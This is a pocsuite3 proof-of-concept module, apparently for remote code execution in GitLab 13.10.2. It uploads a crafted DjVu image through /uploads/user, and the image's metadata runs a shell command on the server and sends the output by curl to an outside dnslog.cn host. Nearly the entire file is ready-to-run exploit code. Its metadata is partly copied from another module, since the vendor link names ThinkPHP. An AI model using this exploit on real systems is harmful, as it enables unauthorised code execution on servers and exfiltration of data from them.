from collections import OrderedDict
from pocsuite3.api import Output, POCBase, register_poc, requests, logger, POC_CATEGORY, OptString
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from bs4 import BeautifulSoup


class POC(POCBase):
    vulID = '6666'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1'  # 默认为1
    author = 'Wing'  # PoC作者的大名
    vulDate = '2020-11-11'  # 漏洞公开的时间,不知道就写今天
    createDate = '2020-11-11'  # 编写 PoC 的日期
    updateDate = '2020-11-11'  # PoC 更新的时间,默认和编写时间一样
    references = ['']  # 漏洞地址来源,0day不用写
    name = 'Gitlab Upload RCE'  # PoC 名称
    appPowerLink = 'https://www.thinkphp.cn'  # 漏洞厂商主页地址
    appName = 'Gitlab'  # 漏洞应用名称
    appVersion = '13.10.2'  # 漏洞影响版本
    vulType = 'Remote code execution'  # 漏洞类型,类型参考见 漏洞类型规范表
    desc = ''' Wing '''  # 漏洞简要描述
    samples = []  # 测试样列,就是用 PoC 测试成功的网站


    def _verify(self):
        result = {}
        session = requests.Session()
        try:
            r = session.get(self.url.rstrip("/") + "/users/sign_in")
            soup = BeautifulSoup(r.text, features="lxml")
            token = soup.findAll('meta')[16].get("content")
            data = "\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5\r\nContent-Disposition: form-data; name=\"file\"; filename=\"test.jpg\"\r\nContent-Type: image/jpeg\r\n\r\nAT&TFORM\x00\x00\x03\xafDJVMDIRM\x00\x00\x00.\x81\x00\x02\x00\x00\x00F\x00\x00\x00\xac\xff\xff\xde\xbf\x99 !\xc8\x91N\xeb\x0c\x07\x1f\xd2\xda\x88\xe8k\xe6D\x0f,q\x02\xeeI\xd3n\x95\xbd\xa2\xc3\"?FORM\x00\x00\x00^DJVUINFO\x00\x00\x00\n\x00\x08\x00\x08\x18\x00d\x00\x16\x00INCL\x00\x00\x00\x0fshared_anno.iff\x00BG44\x00\x00\x00\x11\x00J\x01\x02\x00\x08\x00\x08\x8a\xe6\xe1\xb17\xd9*\x89\x00BG44\x00\x00\x00\x04\x01\x0f\xf9\x9fBG44\x00\x00\x00\x02\x02\nFORM\x00\x00\x03\x07DJVIANTa\x00\x00\x01P(metadata\n\t(Copyright \"\\\n\" . qx{curl `whoami`.q3ddlk.dnslog.cn} . \\\n\" b \") )                                                                                                                                                                                                                                                                                                                                                                                                                                     \n\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5--\r\n\r\n"
            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36", "Connection": "close", "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryIMv3mxRg59TkFSX5", "X-CSRF-Token": f"{token}", "Accept-Encoding": "gzip, deflate"}
            flag = 'Failed to process image'
            req = session.post(self.url.rstrip("/") + "/uploads/user", data=data, headers=headers)
            if flag in req.text:
                result['VerfiryInfo'] = {}
                result['VerfiryInfo']['URL'] = self.url
                result['VerfiryInfo']['Postdata'] = data
        except Exception as e:
            print(e)
        return self.parse_output(result)

    def _options(self):
        o = OrderedDict()
        o['command'] = OptString('whoami', '输入需要执行的命令', require=False)
        return o

    def _attack(self):
        self._verify()

    def _shell(self):
        pass

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(POC)
